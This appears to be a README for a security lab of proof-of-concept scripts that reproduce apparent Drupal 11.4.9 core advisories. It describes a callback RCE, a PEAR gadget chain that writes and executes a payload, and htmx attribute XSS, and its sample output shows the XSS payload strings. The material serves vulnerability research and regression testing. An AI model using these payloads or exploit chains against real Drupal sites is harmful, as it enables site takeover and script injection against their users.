# Standalone PoCs — no Docker, no database, no web server

These scripts drive the **real Drupal 11.4.9 core classes** directly, so
they only need a Drupal source tree. Useful for:

* a quick check on a machine without Docker;
* reading exactly which core API is being abused;
* using the lab as a regression test — each script exits `0` when the bug
  reproduces and `1` when it does not.

## Requirements

* PHP 8.1+ (with `mbstring` for `Html::getClass()`) and/or Node 18+.
* A Drupal 11.4.9 tree: the core tarball plus its composer dependencies
  (`composer install` in the extracted tarball), or a
  `drupal/recommended-project` checkout.

Point the scripts at the directory that **contains `core/`**:

```bash
# drupal/recommended-project layout
export DRUPAL_ROOT=/path/to/project/web

# drupal/drupal (core tarball) layout
export DRUPAL_ROOT=/path/to/drupal-11.4.9
```

or pass it as the first argument.

## The scripts

| Script | Advisory | What it does |
|--------|----------|--------------|
| `f1_field_ui_rce.php` | SA-CORE-2026-014 | Calls the real `FieldUiTable::tablePreRender()` with a row whose `#region_callback` is chosen by the "attacker", and shows the chosen callable running. |
| `f1_gadget_chain.php` | SA-CORE-2026-014 | Full chain: stock PEAR `System::cat` / `System::rm` write a payload and a permissive `.htaccess`, and the payload executes over HTTP. |
| `f2_attribute_xss.php` | SA-CORE-2026-015 | Runs the real `AttributeXss::sanitizeAttributes()` over a table of attribute names, and contrasts it with the upstream `Xss::attributes()`, which *is* hardened. |
| `f3_tooltip_xss.js` | SA-CORE-2026-016 | Extracts the `tooltipWrapper()` implementation out of the target's `tooltip.js` and shows the HTML-injection and attribute-injection primitives. |

## Running them

```bash
php  f1_field_ui_rce.php
php  f2_attribute_xss.php
node f3_tooltip_xss.js
```

Example output:

```
$ php f2_attribute_xss.php
Target Drupal core : /path/to/drupal-11.4.9 (11.4.9)
Vulnerable sink    : core/modules/link/src/AttributeXss.php:41-48
Upstream (correct) : core/lib/Drupal/Component/Utility/Xss.php:297-306

ATTRIBUTE NAME               KEPT?    SANITISED RESULT
--------------------------------------------------------------------
hx-on-click                  KEPT     {"hx-on-click":"alert(document.domain)"}
data-hx-on-click             KEPT     {"data-hx-on-click":"alert(document.domain)"}
onclick                      blocked  []
onerror                      blocked  []
style                        blocked  []
...
=== RESULT ===
VULNERABLE: the following htmx event-handler attributes survive the Link
module's attribute sanitizer and are emitted into the page:
  <a hx-on-click="alert(document.domain)">
  <a data-hx-on-click="alert(document.domain)">
htmx 2.0.4 (shipped by Drupal core) executes these as inline JS.
```

## Note on the autoloader

`drupal_core_autoload.php` is a ~50 line PSR-4 autoloader for
`Drupal\Core\`, `Drupal\Component\` and `Drupal\<module>\`, plus the
composer's `vendor/` tree for the Symfony polyfills. It is deliberately
minimal — the point is to show that these PoCs exercise the *shipped* core
code, not a re-implementation of it.
